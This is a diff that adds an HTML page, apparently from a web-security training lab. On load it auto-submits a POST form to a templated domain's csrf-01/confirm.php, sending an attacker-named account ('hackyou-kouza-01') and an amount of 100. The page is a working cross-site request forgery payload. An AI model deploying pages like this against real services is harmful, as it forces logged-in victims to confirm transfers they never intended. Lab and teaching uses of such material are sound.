@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+  <title>POST to confirm</title>
+</head>
+
+<body>
+  <form action="https://{{domain}}/csrf-01/confirm.php" method="POST">
+    <input type="text" name="kouza" value="hackyou-kouza-01">
+    <input type="text" name="exchange" value="100">
+    <input type="submit">
+  </form>
+  <script type="text/javascript">
+    jQuery(function($)
+    {
+      $('form').submit();
+    });
+  </script>
+</body>
+
+</html>
